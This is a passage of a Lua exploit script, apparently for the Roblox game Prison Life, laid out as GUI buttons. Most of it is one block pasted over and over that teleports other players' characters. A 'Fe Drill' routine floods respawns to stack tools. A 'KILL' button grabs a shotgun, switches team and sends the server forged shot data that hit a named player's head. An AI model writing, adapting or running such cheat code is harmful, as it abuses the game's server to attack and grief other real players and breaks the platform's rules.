for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
end)

drill.Name = "drill"
drill.Parent = main
drill.BackgroundColor3 = Color3.new(1, 1, 0)
drill.Position = UDim2.new(0.343317509, 0, 0.704794705, 0)
drill.Size = UDim2.new(0, 111, 0, 25)
drill.Font = Enum.Font.GothamBold
drill.Text = "Fe Drill"
drill.TextColor3 = Color3.new(0, 0, 0)
drill.TextSize = 14
drill.MouseButton1Down:connect(function()
workspace.Remote.TeamEvent:FireServer("Bright blue")

local toolamount = 80 -- How long the tornado is
local tornadosize = 1 -- The size of how big the opening of the tornado is

local LocalPlayer = game:GetService("Players").LocalPlayer
local runservice = game:GetService("RunService")
local characters = {}
LocalPlayer.Character:FindFirstChild("Humanoid"):UnequipTools()
local currentamount = #LocalPlayer.Backpack:GetChildren()
LocalPlayer.Character.Archivable = true
local tempchar = LocalPlayer.Character:Clone()
tempchar.Parent = workspace
local savepos = LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame
local renderstepped = runservice.RenderStepped:Connect(function()
    workspace.CurrentCamera.CameraSubject = tempchar:FindFirstChild("Humanoid")
    for _, tool in pairs(LocalPlayer.Backpack:GetChildren()) do
    if tool:IsA("Tool") then
            tool.Parent = LocalPlayer
        end
    end
    LocalPlayer.Character:ClearAllChildren()
    local char = Instance.new("Model", workspace)
    table.insert(characters, char)
    Instance.new("Humanoid", char)
    LocalPlayer.Character = char
    repeat runservice.RenderStepped:Wait() until LocalPlayer.Character ~= nil
end)
repeat runservice.RenderStepped:Wait() until #LocalPlayer:GetChildren() - 4 - currentamount >= toolamount
renderstepped:Disconnect()
repeat runservice.RenderStepped:Wait() until LocalPlayer.Character:FindFirstChild("HumanoidRootPart") ~= nil
for _, char in pairs(characters) do
    char:Destroy()
end
for index, tool in pairs(LocalPlayer:GetChildren()) do
    if tool:IsA("Tool") then
        tool.Parent = LocalPlayer.Backpack
        tool.Handle.Massless = false
        tool.Grip = CFrame.new(Vector3.new(0, -index * .1, 0)) * CFrame.Angles(math.rad(90), 0, math.tan(index * 0.5))
        tool.Parent = LocalPlayer.Character
        if tool.Handle:FindFirstChild("Mesh") ~= nil then
            tool.Handle.Mesh:Destroy()
        end
    end
end
LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = savepos
tempchar:Destroy()
end)

killplrmain.Name = "killplrmain"
killplrmain.Parent = main
killplrmain.BackgroundColor3 = Color3.new(1, 0, 1)
killplrmain.Position = UDim2.new(0.0321613066, 0, 0.836535037, 0)
killplrmain.Size = UDim2.new(0, 103, 0, 47)

killtext.Name = "killtext"
killtext.Parent = killplrmain
killtext.BackgroundColor3 = Color3.new(1, 0.666667, 1)
killtext.Position = UDim2.new(0, 0, 0.0212752968, 0)
killtext.Size = UDim2.new(0, 99, 0, 19)
killtext.Font = Enum.Font.Gotham
killtext.Text = "Player Name"
killtext.TextColor3 = Color3.new(0, 0, 0)
killtext.TextSize = 14

kill.Name = "kill"
kill.Parent = killplrmain
kill.BackgroundColor3 = Color3.new(0, 0, 0)
kill.Position = UDim2.new(0.0999999046, 0, 0.531914949, 0)
kill.Size = UDim2.new(0, 80, 0, 22)
kill.Font = Enum.Font.GothamBold
kill.Text = "KILL"
kill.TextColor3 = Color3.new(1, 1, 1)
kill.TextSize = 14
kill.MouseButton1Down:connect(function()
game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP) 

wait(0.1)
Workspace.Remote.TeamEvent:FireServer("Medium stone grey")

local A_1 = 
{
	[1] = 
{
	["RayObject"] = Ray.new(Vector3.new(827.412415, 101.489777, 2296.84326), Vector3.new(277.738678, 6.89340925, 287.773712)), 
	["Distance"] = 4.7204174995422, 
	["Cframe"] = CFrame.new(832.049377, 101.392006, 2300.97168, 0.843892097, -0.0554918349, 0.533635378, 0, 0.994636595, 0.103430569, -0.536512911, -0.0872842371, 0.839366019), 
	["Hit"] = game.Workspace[killtext.Text].Head
}, 
	[2] = 
{
	["RayObject"] = Ray.new(Vector3.new(827.412415, 101.489777, 2296.84326), Vector3.new(303.047546, 21.3568707, 260.203888)), 
	["Distance"] = 4.8114862442017, 
	["Cframe"] = CFrame.new(832.390259, 101.550629, 2300.74097, 0.738044441, -0.112958886, 0.665229917, 7.45057971e-09, 0.985887885, 0.16740793, -0.674752235, -0.123554483, 0.727628946), 
	["Hit"] = game.Workspace[killtext.Text].Head
}, 
	[3] = 
{
	["RayObject"] = Ray.new(Vector3.new(827.412415, 101.489777, 2296.84326), Vector3.new(296.800507, 7.00420141, 268.067932)), 
	["Distance"] = 4.444625377655, 
	["Cframe"] = CFrame.new(832.185486, 101.391617, 2300.70264, 0.775115669, -0.0692948848, 0.628007889, 7.45057971e-09, 0.993967533, 0.109675139, -0.631819367, -0.0850109085, 0.770439863), 
	["Hit"] = game.Workspace[killtext.Text].Head
}, 
	[4] = 
{
	["RayObject"] = Ray.new(Vector3.new(827.412415, 101.489777, 2296.84326), Vector3.new(284.930573, 11.9850616, 280.483368)), 
	["Distance"] = 4.6211166381836, 
	["Cframe"] = CFrame.new(832.10083, 101.445007, 2300.86963, 0.820150614, -0.0735745132, 0.567397356, 0, 0.991697431, 0.128593579, -0.572147667, -0.105466105, 0.81334126), 
	["Hit"] = game.Workspace[killtext.Text].Head
}, 
	[5] = 
{
	["RayObject"] = Ray.new(Vector3.new(827.412415, 101.489777, 2296.84326), Vector3.new(294.625824, 2.15741801, 270.538269)), 
	["Distance"] = 4.4639973640442, 
	["Cframe"] = CFrame.new(832.169434, 101.341301, 2300.73438, 0.784266233, -0.0537625961, 0.618090749, -3.7252903e-09, 0.99623847, 0.086654529, -0.620424569, -0.0679602176, 0.781316102), 
	["Hit"] = game.Workspace[killtext.Text].Head
}
}
local A_2 = game.Players.LocalPlayer.Backpack["Remington 870"]
local Event = game:GetService("ReplicatedStorage").ShootEvent
Event:FireServer(A_1, A_2)

wait(0.5)
workspace.Remote.TeamEvent:FireServer("Bright orange")
end)

waves.Name = "waves"
waves.Parent = main
waves.BackgroundColor3 = Color3.new(1, 1, 0)
